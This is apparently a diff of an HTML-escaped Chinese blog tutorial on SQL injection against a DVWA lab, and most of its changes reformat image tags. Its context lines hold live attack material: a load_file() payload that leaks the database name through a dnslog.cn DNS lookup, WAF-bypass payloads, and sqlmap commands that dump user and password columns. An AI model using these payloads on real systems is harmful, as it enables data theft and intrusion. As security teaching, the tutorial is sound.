+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701173327303.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173327303.png&#34; alt=&#34;image-20250701173327303&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h3 id=&#34;构造注入payload&#34;&gt;构造注入Payload
 &lt;/h3&gt;&lt;p&gt;我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是上文提到过的&lt;code&gt;load_file()&lt;/code&gt;：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#39;.624elh.dnslog.cn\\a&amp;#39;))#
@@ -938,16 +890,13 @@
 &lt;p&gt;&lt;strong&gt;为了访问这个网络路径，服务器的操作系统必须先解析主机名 &lt;code&gt;dvwa.624elh.dnslog.cn&lt;/code&gt;，因此它会向DNS服务器发起一个DNS查询请求&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;回到DNSlog，点击&lt;code&gt;Refresh Record&lt;/code&gt;，将会显示出dns解析记录&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;这样，数据库名&lt;code&gt;&#39;dvwa&#39;&lt;/code&gt;就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173610414.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250701173610414&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701173610414.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173610414.png&#34; alt=&#34;image-20250701173610414&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h2 id=&#34;7-http请求注入&#34;&gt;#7 http请求注入
 &lt;/h2&gt;&lt;h3 id=&#34;getpost请求注入&#34;&gt;GET/POST请求注入
 &lt;/h3&gt;&lt;p&gt;完整看到这里的你，就会发现上面我们讨论的注入绝大多数都是在GET和POST的场景下&lt;/p&gt;
@@ -1028,27 +977,21 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;页面每次都会进行判断，如果随机数是3，就延迟2-4秒，完全干扰了时间盲注，迫使我们只能使用布尔盲注&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;实战中对方可能并不会暴露cookie修改的界面，我们可以使用浏览器自带的开发者工具，或者浏览器扩展&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;f12开发者工具（应用 -&amp;gt; cookie）：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200225693.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250701200225693&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701200225693.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200225693.png&#34; alt=&#34;image-20250701200225693&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;浏览器扩展（比如cookie editor）：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200301860.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250701200301860&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250701200301860.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200301860.png&#34; alt=&#34;image-20250701200301860&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h2 id=&#34;8-二次注入&#34;&gt;#8 二次注入
 &lt;/h2&gt;&lt;p&gt;二次注入比较特殊，它用于审查非常严格的情况下，不是窃取数据，而是篡改数据&lt;/p&gt;
 &lt;p&gt;我们来看这样一个场景：有一个网站允许用户注册账号，之后可以在个人中心修改自己的密码&lt;/p&gt;
@@ -1086,16 +1029,13 @@
 &lt;h3 id=&#34;注释绕过&#34;&gt;注释绕过
 &lt;/h3&gt;&lt;p&gt;在大多数的数据库（特别是mysql）中，&lt;strong&gt;注释&lt;code&gt;/**/&lt;/code&gt;能够代替空格&lt;/strong&gt;：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;/**/union/**/select/**/1,database()#
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250628203003878&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250628203003878.png&#34; alt=&#34;image-20250628203003878&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;可以看到，sql语句能够正常运行&lt;/p&gt;
 &lt;h3 id=&#34;url编码绕过&#34;&gt;url编码绕过
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;一般来说，我们会使用&lt;code&gt;+&lt;/code&gt;代替空格，因为&lt;code&gt;+&lt;/code&gt;是空格的一种url标准编码形式，如果不行，就要另寻他法了&lt;/strong&gt;&lt;/p&gt;
@@ -1176,16 +1116,13 @@
 &lt;p&gt;这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在&lt;code&gt;/*!...*/&lt;/code&gt;里，比如：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union/*!select*/ 1,2 #
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;WAF会把它看成&amp;quot;带有奇怪符号的注释&amp;quot;而放行，但是到了mysql环境里，就能被执行：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250629194535907&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250629194535907.png&#34; alt=&#34;image-20250629194535907&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;我们还可以在&lt;code&gt;/*!...*/&lt;/code&gt;里面加上版本号：&lt;code&gt;/*!50001...*/&lt;/code&gt;，表示数据库是5.00.01及以上版本，该语句才会被执行&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;我使用的dvwa的mysql版本是5.5.53，如果使用&lt;code&gt;1&#39; union/*!60001select*/ 1,2 #&lt;/code&gt;，就会报版本错：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;1,2 #&amp;#39;&amp;#39; at line 1
@@ -1226,16 +1163,13 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database()#
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就成功传入了目标语句&lt;/p&gt;
 &lt;p&gt;附上一张url编码表：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;URL编码表&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34; alt=&#34;URL编码表&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h3 id=&#34;十六进制unicode编码ascii编码绕过&#34;&gt;十六进制、Unicode编码、ASCII编码绕过
 &lt;/h3&gt;&lt;p&gt;其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1%ef%bc%87 or 1=1#
@@ -1557,16 +1491,13 @@
 &lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-u：指定目标url&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;batch：全自动模式，问什么都答对(y)&lt;/strong&gt;&lt;/mark&gt;`&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627092400221.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627092400221&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627092400221.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627092400221.png&#34; alt=&#34;image-20250627092400221&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;sqlmap指出它通过四种不同的方式成功注入了目标：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;boolean-based blind&lt;/code&gt; (布尔盲注)&lt;/strong&gt;&lt;/li&gt;
@@ -1579,58 +1510,46 @@
 &lt;h3 id=&#34;爆破数据库信息&#34;&gt;爆破数据库信息
 &lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-dbs：爆破所有的数据库名称&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --dbs --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093550491.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627093550491&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627093550491.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093550491.png&#34; alt=&#34;image-20250627093550491&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;mark&gt;&amp;ndash;current-db：爆破当前数据库名称&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --current-db --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093857366.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627093857366&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627093857366.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093857366.png&#34; alt=&#34;image-20250627093857366&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;结果说明现在的表名为cms&lt;/p&gt;
 &lt;h3 id=&#34;爆破指定数据库的所有表名&#34;&gt;爆破指定数据库的所有表名
 &lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-D：指定数据库名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;tables：枚举所有表&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms --tables  --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094523174.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627094523174&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627094523174.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094523174.png&#34; alt=&#34;image-20250627094523174&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h3 id=&#34;爆破指定表的所有列名&#34;&gt;爆破指定表的所有列名
 &lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-T：指定表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;colums：枚举所有列&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;注意此处要先指定数据库名，再指定表名：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms -T cms_users --columns  --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094938971.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627094938971&#34;
-	
-	
-&gt;#### extractvalue (XML_document, XPath_string)&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627094938971.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094938971.png&#34; alt=&#34;image-20250627094938971&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+#### extractvalue (XML_document, XPath_string)&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;第一个参数：&lt;code&gt;XML_document&lt;/code&gt; 是目标XML文档&lt;/li&gt;
 &lt;li&gt;第二个参数：&lt;code&gt;XPath_string&lt;/code&gt; &lt;strong&gt;是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容&lt;/strong&gt;&lt;/li&gt;
@@ -1642,93 +1561,74 @@
 &lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-C：指定列名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;dump：取出指定列名的所有数据&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms -T cms_users -C username,password --dump --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627095213209.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627095213209&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627095213209.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627095213209.png&#34; alt=&#34;image-20250627095213209&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h3 id=&#34;查看用户权限&#34;&gt;查看用户权限
 &lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;users：列出数据库管理系统用户&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --users --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101333092.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627101333092&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101333092.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101333092.png&#34; alt=&#34;image-20250627101333092&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;current-user：查看当前连接数据库用户&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --current-user --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101406633.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627101406633&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101406633.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101406633.png&#34; alt=&#34;image-20250627101406633&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;is-dba：判断当前用户是否是DBA（数据库管理员）&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --is-dba --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627101434203&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png&#34;&gt;
+&lt;img src=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png&#34; alt=&#34;image-20250627101434203&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;如果是数据库管理员，就代表有写的权限，可以在服务器上面写入一句话木马&lt;/p&gt;&lt;/blockquote&gt;
 &lt;h3 id=&#34;查看数据库密码&#34;&gt;查看数据库密码
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;&amp;ndash;password：自动寻找有没有常见的用户名和密码列&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;可以看成是一系列操作（找到password表和dump）的自动化&lt;/strong&gt;：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -passwords
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627111514038.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627111514038.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627111514038.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
